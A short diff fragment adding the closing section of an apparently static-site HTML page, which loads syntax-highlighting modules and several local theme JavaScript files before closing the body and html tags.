+        <script src="../../../theme/js/hljs/x86asm.min.js"></script>
+      
+        <script src="../../../theme/js/hljs/cmake.min.js"></script>
+      
+        <script src="../../../theme/js/hljs/http.min.js"></script>
+      
+        <script src="../../../theme/js/highlight.js"></script>
+      
+        <script src="../../../theme/js/site.js"></script>
+      
+        <script src="../../../theme/js/site-home.js"></script>
+      
+        <script src="../../../theme/js/site-terminal.js"></script>
+      
+        <script src="../../../theme/js/site-images.js"></script>
+      
+        <script src="../../../theme/js/site-pdf.js"></script>
+      
+        <script src="../../../theme/js/site-friends.js"></script>
+      
+        <script src="../../../theme/js/site-github.js"></script>
+      
+    
+  </body>
+</html>
